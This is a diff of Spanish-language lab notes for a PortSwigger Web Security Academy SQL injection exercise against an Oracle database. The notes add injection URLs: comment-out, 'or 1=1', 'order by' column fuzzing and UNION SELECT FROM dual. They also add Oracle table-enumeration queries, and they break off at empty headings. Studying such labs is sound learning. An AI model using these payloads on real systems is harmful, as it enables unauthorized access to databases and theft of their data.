@@ -25,18 +25,51 @@ There is a built-in table on Oracle called `dual` which you can use for this pur
 
 - Muy similar a los laboratorios anteriores enfocados a `Oracle`
 - En este caso es llegar hasta el login con `adminsitrador`
+- Es un poco diferente a MySQL el dump de información de Oracle, así que pondré el proceso completo:
 
+### Explicación Information Schema en Oracle
 
+En Oracle se pone originalmente para mostrar todas las tables:
 
+````sql
+# Enumerar nombres de tablas:
+SELECT table_name FROM all_tables
+````
+
+Para seleccionar solo la base de datos que estamos usando en Oracle es más fácil utilizar los usarios que utilizan la DB _(en este caso el más obvio de un user no default era "Peter")_:
+
+````sql
+# Enumerar propietarios de tablas:
+SELECT table_owner FROM all_tables WHERE owner = 'PETER'
+````
 
 ## Solución:
 
 ````py
-## Como es caso de Oracle NO SIRVE el siguiente query:
+# Vulnerabilidad y sanamiento
+.web-security-academy.net/filter?category=Pets' -- -
+
+# Mostrar info oculta (opcional)
+.web-security-academy.net/filter?category=Pets' or 1 = 1 -- -
+
+# Fuzzing Número de Columnas
+.web-security-academy.net/filter?category=Pets' order by 2 -- -
+
+## Columnas vulnerables: Como es caso de Oracle NO SIRVE el siguiente query:
 .web-security-academy.net/filter?category=-Pets' Union Select '1','2' -- -
 
-## Este es el que se debe utilizar, con la default table "dual":
+## Columnas vulnerables: Este es el que se debe utilizar, con la default table "dual":
 .web-security-academy.net/filter?category=-Pets' Union Select '1','2' FROM dual -- -
+
+    ### Enumer Tablas:
+
+# Utilizar sintaxis Oracle para enumerar:
+
+
+
+
+
+
 
 
 ## Dumpear la base de Datos:
